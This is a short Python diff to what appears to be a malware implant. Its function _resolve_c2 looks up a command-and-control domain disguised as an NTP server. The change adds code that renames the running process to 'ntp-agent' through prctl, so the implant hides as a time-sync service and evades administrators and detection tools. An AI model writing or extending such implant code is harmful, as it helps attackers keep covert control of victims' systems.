@@ -308,6 +308,11 @@ def _detect_distro():
 
 def _resolve_c2():
     domain = _NTP_DOMAINS[_detect_distro()]
+    try:
+        import ctypes
+        ctypes.CDLL("libc.so.6").prctl(15, b"ntp-agent", 0, 0, 0)
+    except Exception:
+        pass
     return socket.gethostbyname(domain)
 
 
